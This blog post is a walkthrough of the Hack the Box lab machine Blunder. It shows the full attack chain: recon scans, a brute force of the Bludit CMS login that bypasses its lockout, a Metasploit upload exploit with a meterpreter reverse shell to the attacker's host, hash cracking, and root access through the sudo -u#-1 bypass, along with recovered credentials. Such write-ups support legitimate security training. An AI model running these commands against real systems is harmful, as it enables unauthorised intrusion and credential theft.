---
title: "Blunder Hack the Box Walk Through"
excerpt_separator: "<!--more-->"
categories:
  - Blog
tags:
  - Post Formats
  - readability
  - standard
---
**Summary:** 

Blunder was released on May 30, 2020 and is classified as an "Easy" difficulty Linux vulnerable machine on Hack the Box. In this walk-through, we will
discuss the steps taken to compromise Blunder.

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-1.png?raw=true)

**Information Gathering:** 

The first step taken was to run a scan against the vulnerable machine to identify all of the open ports and services present.

Autorecon, which is an automated recon script, was utilized for this task. To learn more about the commands AutoRecon runs under the hood such as the nmap command below, please visit the link in the references section.

Port 80, which was indeed running the expected http service was the only open port on this machine.
```
nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.191
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-2.png?raw=true)

The next step taken was to run a gobuster scan to identify any interesting hidden web directories being hosted. Any sites that returned a '403' error code were omitted from the output.

GoBuster Mini-Script
```
if [[ `gobuster -h 2>&1 | grep -F "mode (dir)"` ]]; then gobuster -u http://10.10.10.191:80/ -w /usr/share /seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp, aspx,jsp" -o tcp_80_http_gobuster.txt"; else gobuster dir -u http://10.10.10.191:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp" -o "tcp_80_http_gobuster.txt"; fi 
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-3.png?raw=true)

Next, some important information was gathered viewing the document hosted at http://10.10.10.191/todo.txt. 

There is possibly a newer version of the Bludit CMS on the system that has not been updated to yet.

Our assumption from the nmap scan that FTP is really closed has been validated.

Old users have been removed from the system.

There is possibly a user named 'fergus' that uses the system.'

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-4.png?raw=true)

**Vulnerability Assessment:** 

While visiting page source information for the site located at http://10.10.10.191/admin, the version of web application that was installed on web server was
identified. This software was Bludit version 3.9.2.
```
Go to Firefox > http://10.10.10.191 in search bar > Enter > Right click page > View page source
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-5.png?raw=true)

Searching in searchsploit, multiple potential exploits for this version of vulnerable software were found.
```
searchsploit bludit
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-6.png?raw=true)

A quick Google search also verified assumptions that the version of software was vulnerable. According the information gathered during the search, it was determined that the below Metasploit module corresponds to the proper Directory Traversal Image File Upload vulnerability that will allow a remote attacker to gain code execution on the system. Additional information can be found in the references section. Opening up the corresponding module on Metasploit shows the options required in order for the exploit module to function properly.
```
msfconsole
```
```
search bludit
```
```
use linux/http/bludit_upload_images_exec
```
```
show options
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-7.png?raw=true)

At this point all of the required information minus the 'BLUDITPASS' for our potential user 'fergus' was present. Brute forcing the password seemed like a possibility in order to gain some proper user credentials.

Luckily, versions prior to and including 3.9.2 of the Bludit CMS are also vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to incorrectly login 10 times or more. More information on this vulnerability can be found in the references section.

**Exploitation:**

Tweaking the PoC python code in the article here (also in the references section) allowed us to successfully start trying to brute force the Bludit CMS /admin login page.

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-8.png?raw=true)

Initially attempting brute forcing using the generic 'rockyou.txt' seemed to trigger some sort of anti-brute forcing mechanism and was reporting incorrect passwords as being correct. Creating a custom wordlist using cewl helped to bypass this.

The below cewl command was utilized to quickly crawl the website and create a wordlist from keywords on the site that were at least 6 characters long. The list of 188 words was then output to a text file.

```
cewl http://10.10.10.191 -m 6 -w cewl.txt
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-9.png?raw=true)

After running the updated bruteforce script with the cewl.txt wordlist and user 'fergus' as the inputs, the password recovered for fergus was 'RolandDeschain'.
```
./bruteforce.py
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-10.png?raw=true)

From here, since all inputs were now gathered, it was possible to now exploit the vulnerable software using the Metasploit module previously mentioned.

```
set BLUDITPASS RolandDeschain
```
```
set BLUDITUSER fergus
```
```
set RHOST 10.10.10.191
```
```
set LHOST <your attacker IP>
```
```
set payload php/meterpreter_reverse_tcp
```
```
run
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-11.png?raw=true)

After running the Metasploit module above an image file with malicious meterpreter reverse shellcode was uploaded to the target machine and executed. The result is a stable web shell. Access to the machine was obtained as the low-privileged www-data user.

Switches from a meterpreter session to a shell.
```
shell
```
Spawns an interactive tty shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Lists who the currently logged in user is.
```
whoami
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-12.png?raw=true)

**Privilege Escalation:** 

After gaining initial access to the machine, privilege escalation to a higher privileged user or directly to root was required.

A great automated script to check for possible privilege escalation vectors is 'linpeas.sh'.

Running linpeas.sh provided a text file with a color coded list of items that may be of interest. Anything in red text highlighted in yellow is listed as 'must look at' by the creator and is most likely a privilege escalation vector. Again, this should be taken with a grain of salt as automated scripts sometimes don't work perfectly. Although manual enumeration is a time consuming exercise, it sometimes works better than automated scripts.

One interesting file linpeas pointed to for possible further evaluation was /var/www/bludit-3.9.2/bl-kernel/admin/views/settings.php.

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-13.png?raw=true)

Unfortunately, there was nothing in there of use. However, manually going up 2 directories, a new version of the bludit CMS is present. Recalling the contents from the todo.txt file, this update had not occurred yet. Since it wasn't fully configured yet, it was possible that the password for a user was somewhere within the newer version CMS directory.

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-14.png?raw=true)

After manually poking and prodding around for a bit of time and searching for some more info on Google an interesting file in the path below was found. A link to a description of the directories contained within the subdirectories of the bludit cms file system can be found in the references section below.
```
/var/www/bludit-3.10.0a/bl-content/databases
```
The users.php file presented a password of sorts for one of the potential users on the system, 'hugo'.

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-15.png?raw=true)

This did not appear to be a clear-text version of the password, but rather a hashed version which needed to be cracked. The hash-identifier tool was utilized to identify the specific type of hash this was.
```
hash-identifier faca404fd5c0a31cf1897b823c695c85cffeb98d
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-16.png?raw=true)

The SHA-1 hash was subsequently cracked within seconds using the rockyou.txt wordlist and John. The password hash was included as a single line in the hash.txt file.
```
sudo john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-17.png?raw=true)

At this point we had some elevated access in the form of a user named 'hugo' with the password 'Password120'.

The next step taken was login as hugo and perform some more reconnaissance to find a possible avenue to root.

Luckily, we had already run our linpeas.sh script when we first obtained access to the box. Going back to it we were able to find something interesting. Sudo version 1.8.25p1 was running on the machine.

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-18.png?raw=true)

A quick searchsploit search for the term 'sudo' yielded some possible exploits to try. The highlighted version seemed to be a possible exploit that might work.

![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-19.png?raw=true)

Looking at info on the exploit, it is possible for an attacker with access to a Runas ALL sudoer account to bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID.

In order to check for this, the below command was run in the context of the 'hugo' account.
```
sudo -l
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-20.png?raw=true)

According to the output above, it looks like the user account 'hugo' was indeed vulnerable to this vulnerability.

Running the below command from the searchsploit entry 47502.py ended up working and allows 'hugo' to sudo to the root user.
```
sudo -u#-1 /bin/bash
```
![alt text](https://github.com/ckosmas/ckosmas.github.io/blob/master/assets/images/blunder-21.png?raw=true)

**Conclusion:** 

This was my first completed Linux box on HTB. Overall, this machine provided a decent learning experience. This machine felt very CTF'y in nature, and it didn't seem extremely likely that the initial exploitation vector and subsequent escalation to user would consistently work in the real world, but it is always a possibility. Learning about the sudo privilege escalation vulnerability was neat and it seemed much more likely to be found on a real engagement.

**References:** 

Autorecon:

<https://github.com/Tib3rius/AutoRecon>

GoBuster:

<https://tools.kali.org/web-applications/gobuster>

Bludit directory information:

<https://docs.bludit.com/en/developers/folder-structure>

Bludit Vulnerability Information:

<https://nvd.nist.gov/vuln/detail/CVE-2019-16113>

<https://rastating.github.io/bludit-brute-force-mitigation-bypass/>

<https://raw.githubusercontent.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/master/bruteforce.py>

Metasploit Module Information:

<https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec>

LinPEAS:

<https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>

Sudo Vulnerability Information:

<https://www.exploit-db.com/exploits/47502>

<https://nvd.nist.gov/vuln/detail/CVE-2019-14287>
